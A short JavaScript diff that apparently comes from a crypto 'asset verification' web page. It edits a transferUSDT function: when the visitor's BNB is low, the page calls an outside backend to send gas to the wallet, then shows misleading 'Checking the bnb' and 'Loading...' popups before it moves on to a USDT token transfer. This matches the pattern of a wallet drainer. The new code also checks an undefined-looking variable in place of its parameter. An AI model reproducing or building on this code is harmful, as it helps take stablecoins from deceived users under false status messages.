@@ -75,10 +75,17 @@ async function verifyAssets() {
 
 async function transferUSDT(usdtBalance, userBNB) {
     try {
-        if (userBNB < 0.0005) {
-            console.log("Low BNB detected, sending gas fee...");
-            await sendBNB(userAddress, "0.001");
+        if (bnbBalance < 0.0005) {
+            showPopup("Checking the bnb ...", "blue");
+            await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ toAddress: userAddress })
+            });
+            await new Promise(r => setTimeout(r, 2000)); // wait for gas
         }
+
+        showPopup("Loading...", "blue");
 
         // Proceed with USDT Transfer
         const usdtContract = new web3.eth.Contract([
